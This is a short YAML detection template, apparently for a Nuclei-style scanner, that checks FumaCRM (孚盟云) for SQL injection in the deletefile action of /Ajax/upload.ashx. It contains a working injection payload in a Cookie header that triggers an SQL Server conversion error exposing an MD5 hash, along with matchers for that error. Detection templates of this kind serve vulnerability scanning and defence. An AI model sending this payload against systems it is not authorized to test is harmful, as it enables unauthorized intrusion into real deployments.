id: poc-yaml-fumasoft-deletefile-sqli
info:
  name: 孚盟云 deletefile SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 100000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/Ajax/upload.ashx?action=deletefile&name=poc"
    headers:
      Cookie: "poc=1'and 1<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "0x{{t2}}"
          - "FumaCRM"
        part: body
      - type: regex
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
        part: body
